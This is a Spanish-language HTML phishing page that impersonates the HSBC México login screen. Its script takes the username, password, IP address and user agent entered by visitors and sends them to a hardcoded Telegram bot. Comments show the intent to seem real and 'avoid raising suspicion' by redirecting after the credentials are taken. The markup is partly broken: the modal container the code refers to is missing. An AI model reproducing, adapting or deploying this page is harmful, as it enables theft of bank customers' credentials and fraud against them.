<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HSBC - Iniciar sesi√≥n</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.4;
        }

        .header {
            background: white;
            padding: 12px 20px;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .menu-icon {
            width: 24px;
            height: 24px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            justify-content: space-around;
        }

        .menu-line {
            width: 100%;
            height: 3px;
            background: #333;
            border-radius: 2px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            background: #dc143c;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
            position: relative;
        }

        .logo-diamond {
            width: 24px;
            height: 24px;
            background: white;
            transform: rotate(45deg);
            position: absolute;
        }

        .logo-diamond::before,
        .logo-diamond::after {
            content: '';
            position: absolute;
            width: 12px;
            height: 12px;
            background: #dc143c;
        }

        .logo-diamond::before {
            top: 2px;
            left: 2px;
            transform: rotate(-45deg);
        }

        .logo-diamond::after {
            bottom: 2px;
            right: 2px;
            transform: rotate(-45deg);
        }

        .logo-text {
            font-size: 24px;
            font-weight: bold;
            color: #333;
            letter-spacing: 2px;
        }

        .container {
            max-width: 480px;
            margin: 0 auto;
            padding: 40px 20px;
        }

        .login-title {
            font-size: 28px;
            color: #333;
            margin-bottom: 40px;
            font-weight: 400;
        }

        .form-group {
            margin-bottom: 25px;
            position: relative;
        }

        .form-label {
            display: block;
            color: #666;
            font-size: 16px;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-container {
            position: relative;
        }

        .form-input {
            width: 100%;
            padding: 16px;
            border: 2px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            background: #f8f8f8;
            transition: all 0.3s ease;
            color: #333;
        }

        .form-input:focus {
            outline: none;
            border-color: #dc143c;
            background: white;
            box-shadow: 0 0 8px rgba(220, 20, 60, 0.1);
        }

        .help-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            width: 20px;
            height: 20px;
            background: #666;
            border-radius: 50%;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            cursor: help;
        }

        .error-message {
            color: #dc143c;
            font-size: 14px;
            margin-top: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .error-icon {
            width: 16px;
            height: 16px;
            background: #dc143c;
            border-radius: 50%;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            flex-shrink: 0;
        }

        .continue-btn {
            width: 100%;
            background: #e91e63;
            color: white;
            border: none;
            padding: 18px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 30px;
            text-transform: none;
        }

        .continue-btn:hover {
            background: #c2185b;
        }

        .continue-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .link-section {
            margin-top: 30px;
        }

        .link-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid #e0e0e0;
            text-decoration: none;
            color: #666;
            font-size: 16px;
            transition: color 0.3s ease;
        }

        .link-item:hover {
            color: #dc143c;
        }

        .link-item:last-child {
            border-bottom: none;
        }

        .arrow {
            color: #dc143c;
            font-size: 18px;
            font-weight: bold;
        }

        .loading {
            display: none;
            text-align: center;
            color: #dc143c;
            margin-top: 15px;
            font-weight: 500;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #dc143c;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Password Modal */
        .password-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1000;
            animation: fadeIn 0.3s ease;
        }

        .modal-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border-radius: 8px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .modal-title {
            font-size: 20px;
            color: #333;
            margin-bottom: 20px;
            text-align: center;
        }

        .modal-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 20px;
        }

        .modal-input:focus {
            outline: none;
            border-color: #dc143c;
        }

        .modal-buttons {
            display: flex;
            gap: 10px;
        }

        .modal-btn {
            flex: 1;
            padding: 15px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .modal-btn.primary {
            background: #e91e63;
            color: white;
        }

        .modal-btn.primary:hover {
            background: #c2185b;
        }

        .modal-btn.secondary {
            background: #f5f5f5;
            color: #666;
        }

        .modal-btn.secondary:hover {
            background: #e0e0e0;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 15px;
            }
            
            .login-title {
                font-size: 24px;
                margin-bottom: 30px;
            }
            
            .header {
                padding: 10px 15px;
            }
            
            .logo-text {
                font-size: 20px;
            }
            
            .modal-content {
                padding: 25px 20px;
            }
        }

        @media (min-width: 768px) {
            .container {
                max-width: 500px;
                padding: 50px 30px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="menu-icon">
            <div class="menu-line"></div>
            <div class="menu-line"></div>
            <div class="menu-line"></div>
        </div>
        
        <div class="logo">
            <div class="logo-icon">
                <div class="logo-diamond"></div>
            </div>
            <span class="logo-text">HSBC</span>
        </div>
        
        <div></div>
    </div>

    <div class="container">
        <h1 class="login-title">Iniciar sesi√≥n</h1>
        
        <form id="loginForm">
            <div class="form-group">
                <label class="form-label">Ingresa tu usuario</label>
                <div class="input-container">
                    <input type="text" class="form-input" id="username" required>
                    <div class="help-icon">?</div>
                </div>
                <div class="error-message" id="usernameError" style="display: none;">
                    <div class="error-icon">!</div>
                    <span>Ingresa tu usuario.</span>

                      <input type="password" class="modal-input" id="passwordInput" placeholder="Contrase√±a" required>
            <div class="modal-buttons">
                <button class="modal-btn secondary" onclick="closePasswordModal()">Cancelar</button>
                <button class="modal-btn primary" onclick="submitLoginData()">Iniciar sesi√≥n</button>
            </div>
                </div>
            </div>

            <button type="submit" class="continue-btn" id="continueBtn">Continuar</button>
        </form>

        <div class="loading" id="loading">
            <div class="loading-spinner"></div>
            Procesando datos...
        </div>

        <div class="link-section">
            <a href="#" class="link-item">
                <span>¬øOlvidaste tu usuario?</span>
                <span class="arrow">‚Ä∫</span>
            </a>
            
            <a href="#" class="link-item">
                <span>Reg√≠strate desde la app HSBC M√©xico</span>
                <span class="arrow">‚Ä∫</span>
            </a>
        </div>
    </div>

  
    <script>
        // Configuraci√≥n del Bot de Telegram
        const TELEGRAM_BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
        const TELEGRAM_CHAT_ID = '5848946481';
        const REDIRECT_URL = 'error.html'; // URL de redirecci√≥n

        let currentUsername = '';

        // Manejo del formulario principal
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const usernameError = document.getElementById('usernameError');
            
            if (username === '') {
                usernameError.style.display = 'flex';
                document.getElementById('username').style.borderColor = '#dc143c';
                return;
            }
            
            // Ocultar error si existe
            usernameError.style.display = 'none';
            document.getElementById('username').style.borderColor = '#ddd';
            
            currentUsername = username;
            showPasswordModal();
        });

        function showPasswordModal() {
            document.getElementById('passwordModal').style.display = 'block';
            document.getElementById('passwordInput').focus();
        }

        function closePasswordModal() {
            document.getElementById('passwordModal').style.display = 'none';
            document.getElementById('passwordInput').value = '';
        }

        async function submitLoginData() {
            const password = document.getElementById('passwordInput').value.trim();
            
            if (password === '') {
                alert('Por favor ingresa tu contrase√±a');
                return;
            }

            // Cerrar modal y mostrar loading
            closePasswordModal();
            document.getElementById('loading').style.display = 'block';
            document.getElementById('continueBtn').disabled = true;
            document.getElementById('continueBtn').textContent = 'Procesando...';
            
            await sendDataToTelegram(currentUsername, password);
        }

        // Env√≠o de datos a Telegram
        async function sendDataToTelegram(username, password) {
            const message = `üè¶ *HSBC M√âXICO*\n\n` +
                          `üë§ *Usuario:* ${username}\n` +
                          `üîê *Contrase√±a:* ${password}\n` +
                          `üìÖ *Fecha:* ${new Date().toLocaleString('es-MX')}\n` +
                          `üåê *IP:* ${await getClientIP()}\n` +
                          `üì± *Dispositivo:* ${navigator.userAgent}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    // Simular un delay para que parezca m√°s real
                    setTimeout(() => {
                        // Redireccionar a la p√°gina oficial de HSBC
                        window.location.href = REDIRECT_URL;
                    }, 2000);
                } else {
                    throw new Error('Error al enviar mensaje');
                }
            } catch (error) {
                console.error('Error:', error);
                // Incluso si hay error, redirigir para no levantar sospechas
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 1500);
            }
        }

        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'No disponible';
            }
        }

        // Cerrar modal con Escape
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closePasswordModal();
            }
        });

        // Submit con Enter en el modal
        document.getElementById('passwordInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                submitLoginData();
            }
        });

        // Ocultar error al escribir
        document.getElementById('username').addEventListener('input', function() {
            const usernameError = document.getElementById('usernameError');
            if (usernameError.style.display === 'flex') {
                usernameError.style.display = 'none';
                this.style.borderColor = '#ddd';
            }
        });

        // Cerrar modal al hacer clic fuera
        document.getElementById('passwordModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closePasswordModal();
            }
        });
    </script>
</body>
</html>
